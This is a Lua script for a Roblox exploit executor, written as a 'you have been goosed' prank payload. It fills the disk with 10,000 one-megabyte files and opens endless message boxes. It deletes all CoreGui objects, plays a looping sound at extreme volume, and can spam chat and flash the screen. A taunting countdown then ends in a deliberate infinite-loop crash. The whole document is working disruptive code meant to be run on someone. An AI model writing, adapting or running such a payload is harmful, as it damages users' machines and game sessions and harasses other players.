-- Services
local TextChatService = cloneref(game:GetService("TextChatService"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local Workspace = cloneref(game:GetService("Workspace"))
local SoundService = cloneref(game:GetService("SoundService"))
local Lighting = cloneref(game:GetService("Lighting"))
local Players = cloneref(game:GetService("Players"))
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")

-- Chat Properties
if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
	isChatModule = "New"
else
	isChatModule = "Legacy"
end

local function chat(str)
	if isChatModule == "New" then
		game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(str)
	elseif isChatModule == "Legacy" then
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
	end
end
-- Functions
local function crash()
	wait(.1)
	while true do end
end

local function filebomb()
	local text = ("w"):rep(1000000)
	for i = 1, 10000 do
		writefile("you have been goosed"..i..".txt", text)
	end
end

local function msgbox()
	if messagebox then
		while true do
			messagebox("you have been goosed", "you have been goosed", 2+16)
			task.wait()
		end
	end
end

local function delete_coregui()
	for _, v in pairs(CoreGui:GetDescendants()) do
		v:Destroy()
		print(`Deleting CoreGui Object: {v}`)
	end
end

-- Music
local Sound = Instance.new("Sound", SoundService)
Sound.Name = "goosed!!!"
Sound.SoundId = "rbxassetid://".._G.SoundId
Sound.Volume = 10000
Sound.Looped = true
Sound.archivable = false

task.wait(_G.Delayed_1)
Sound:Play()
task.wait(_G.Delayed_2)

task.spawn(filebomb)
task.spawn(msgbox)
task.spawn(delete_coregui)

-- coroutine.wrap(filebomb)()
-- coroutine.wrap(msgbox)()
-- coroutine.wrap(delete_coregui)()

-- Properties
local ScreenGui = Instance.new("ScreenGui", CoreGui) -- PlayerGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Enabled = true

local Frame = Instance.new("Frame", ScreenGui)
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0.23317112, 0, 0.292214155, 0)
Frame.Size = UDim2.new(0, 548, 0, 256)

local TextLabel = Instance.new("TextLabel", Frame)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0492700711, 0, -0.015625, 0)
TextLabel.Size = UDim2.new(0, 495, 0, 107)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "LOL!!!!!!!!!!!!!!!! you have been goosed!! ur game will crash in:"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

local TextLabel_2 = Instance.new("TextLabel", Frame)
TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.131386861, 0, 0.453125, 0)
TextLabel_2.Size = UDim2.new(0, 405, 0, 116)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

-- Scripts
local function BHHDQA_fake_script() -- TextLabel_2.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_2)

	local min = _G.Minutes -- To change the countdown time, change ONLY these three numbers.
	local sec = _G.Seconds -- Please note that min stands for Minutes, sec for Seconds, and mic
	local mic = 0 -- for Microseconds. This is NOT 100% accurate and gives about 18

	-----------------------------------------------------------------------------------------
	-------  more seconds per 5 minutes you have on the timer. The math comes
	------- to about 3.6 more seconds per minute. It is hardly too noticable.
	-------
	-------  .6 seconds is about 36 microseconds. Keeping this in mind, note
	------- the table below for approximate times to times you may select.
	-----------------------------------------------------------------------------------------
	-------  Selected Time   ---------------------------------    Approximate Time    -------
	-------     1 minute     ---------------------------------       1:03:36          -------
	-------    2 minutes     ---------------------------------       2:06:72          -------
	-------    5 minutes     ---------------------------------       5:18:00          -------
	-------   10 minutes     ---------------------------------       10:36:00         -------
	-------   12 minutes     ---------------------------------       12:42:72         -------
	-------   15 minutes     ---------------------------------       15:54:00         -------
	-------   20 minutes     ---------------------------------       21:12:00         -------
	-------   25 minutes     ---------------------------------       26:30:00         -------
	-------   30 minutes     ---------------------------------       31:48:00         -------
	-----------------------------------------------------------------------------------------

	h = script.Parent

	while true do
		mic = mic - 2
		if mic <= -1 then
			sec = sec - 1
			mic = 59
			if sec == -1 then
				min = min - 1
				sec = 59
				if min == -1 then
					min = 0
					sec = 0
					mic = 0
					task.spawn(crash)
				end
			end
		end
		if min <= 9 and sec <= 9 and mic <= 9 then
			h.Text = "0"..min..":0"..sec..".0"..mic
		elseif min <= 9 and sec <= 9 and mic >= 10 then
			h.Text = "0"..min..":0"..sec.."."..mic
		elseif min <= 9 and sec >= 10 and mic <= 9 then
			h.Text = "0"..min..":"..sec..".0"..mic
		elseif min <= 9 and sec >= 10 and mic >= 10 then
			h.Text = "0"..min..":"..sec.."."..mic
		elseif min >= 10 and sec <= 9 and mic <= 9 then
			h.Text = min..":0"..sec..".0"..mic
		elseif min >= 10 and sec <= 9 and mic >= 10 then
			h.Text = min..":0"..sec.."."..mic
		elseif min >= 10 and sec >= 10 and mic <= 9 then
			h.Text = min..":"..sec..".0"..mic
		elseif min >= 10 and sec >= 10 and mic >= 10 then
			h.Text = min..":"..sec.."."..mic
		end
		task.wait(.027)
	end
end
coroutine.wrap(BHHDQA_fake_script)()

local function LYHSLY_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)
	
	hint = Instance.new("Hint")
	hint.Parent = script
	hint.Text = "XD! get goosed lmfaoooooooooooo!!!!!!!111"
end
coroutine.wrap(LYHSLY_fake_script)()

local function HCSRLY_fake_script() -- Frame.1 
	local script = Instance.new('LocalScript', Frame)

    if _G.ChatSpam == true then
        while true do
            chat("lol")
            task.wait(.1)
        end
    end
end
coroutine.wrap(HCSRLY_fake_script)()

local function MIWXME_fake_script() -- Frame.2 
	local script = Instance.new('LocalScript', Frame)

    if _G.FovChanger == true then
        while true do
            for count = 1, 120 do
                Workspace.CurrentCamera.FieldOfView = count
                task.wait()
            end
            task.wait()
        end
    end
end
coroutine.wrap(MIWXME_fake_script)()

local function ZSRBTV_fake_script() -- Frame.3 
    local script = Instance.new('LocalScript', Frame)

    if _G.Disco == true then
		Lighting.Brightness = 0
        while true do
            Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
            task.wait(.25)
        end 
    end
end
coroutine.wrap(ZSRBTV_fake_script)()
